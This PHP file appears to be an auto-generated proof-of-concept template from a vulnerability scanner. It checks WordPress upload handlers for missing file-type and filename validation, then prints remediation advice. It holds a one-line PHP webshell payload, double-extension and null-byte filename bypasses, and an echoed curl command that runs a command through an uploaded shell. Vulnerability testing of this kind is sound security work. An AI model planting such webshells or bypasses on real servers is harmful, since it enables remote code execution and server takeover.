<?php
/**
 * PoC Template: Arbitrary File Upload
 * Auto-generated from ZeroKit finding
 * 
 * Vulnerability: {{CATEGORY}}
 * Location: {{FILE}}:{{LINE}}
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "====================================\n";
echo "🎯 PoC: Arbitrary File Upload\n";
echo "Location: {{FILE}}:{{LINE}}\n";
echo "====================================\n\n";

// =====================================================
// EXPLOIT PAYLOADS
// =====================================================
echo "[*] Testing file upload with malicious payloads\n";

// Create test malicious file
$payload_webshell = "<?php system(\$_GET['cmd']); ?>";
$payload_filename = "shell.php";
$payload_bypass_ext = "shell.php.txt"; // Double extension
$payload_null_byte = "shell.php\x00.jpg"; // Null byte injection

// =====================================================
// VULNERABLE CODE EXECUTION
// =====================================================
// Template manager will replace this section with actual vulnerable code
$output = '';
$code = '';
ob_start();
// VULNERABLE_CODE_PLACEHOLDER
$output = ob_get_clean();

// =====================================================
// VERIFICATION
// =====================================================
$success = false;

// Check for missing file type validation
if (!preg_match('/(mime|type|extension|fileinfo|finfo_file)/i', $code)) {
    echo "✅ VULNERABILITY CONFIRMED: No file type validation\n";
    $success = true;
}

// Check for weak extension validation (blacklist instead of whitelist)
if (preg_match('/!=.*\.(php|phtml|php5)/i', $code) && 
    !preg_match('/==.*\.(jpg|jpeg|png|gif|pdf)/i', $code)) {
    echo "⚠️  Blacklist-based validation detected (bypassable)\n";
    $success = true;
}

// Check if file was uploaded successfully
if (preg_match('/(uploaded|success|saved|moved)/i', $output)) {
    echo "✅ VULNERABILITY CONFIRMED: File upload successful\n";
    $success = true;
}

// Check for missing wp_handle_upload (WordPress best practice)
if (!stripos($code, 'wp_handle_upload') && 
    !stripos($code, 'media_handle_upload') &&
    preg_match('/move_uploaded_file|file_put_contents/i', $code)) {
    echo "⚠️  Custom upload handler not using WordPress APIs\n";
    $success = true;
}

// Check for path traversal in filename
if (!preg_match('/(basename|sanitize_file_name)/i', $code)) {
    echo "✅ VULNERABILITY CONFIRMED: No filename sanitization (path traversal risk)\n";
    $success = true;
}

// Check for executable file in web directory
if (preg_match('/\.php|\.phtml|\.php5/i', $output) && 
    preg_match('/(wp-content\/uploads|public)/i', $output)) {
    echo "🚨 CRITICAL: PHP file uploaded to web-accessible directory!\n";
    echo "    Remote Code Execution is possible\n";
    $success = true;
}

// =====================================================
// RCE VERIFICATION (if php file uploaded)
// =====================================================
if ($success && preg_match('/uploads\/.*\.php/i', $output)) {
    echo "\n[*] Attempting to execute uploaded webshell...\n";
    // In real scenario, would curl to uploaded file
    echo "    curl http://target.com/wp-content/uploads/shell.php?cmd=id\n";
}

// =====================================================
// RESULT
// =====================================================
echo "\n====================================\n";
if ($success) {
    echo "🚨 RESULT: EXPLOITABLE (Arbitrary File Upload)\n";
    echo "Severity: {{SEVERITY}}\n";
    echo "Impact: Remote Code Execution, server compromise, defacement\n";
    echo "\nRecommendation:\n";
    echo "  - Use wp_handle_upload() or media_handle_upload()\n";
    echo "  - Validate MIME type with finfo_file()\n";
    echo "  - Use whitelist for allowed extensions\n";
    echo "  - Sanitize filename with sanitize_file_name()\n";
    echo "  - Store uploads outside webroot or block PHP execution\n";
    exit(0);
} else {
    echo "❌ RESULT: NOT EXPLOITABLE\n";
    echo "Proper file upload validation present\n";
    exit(1);
}
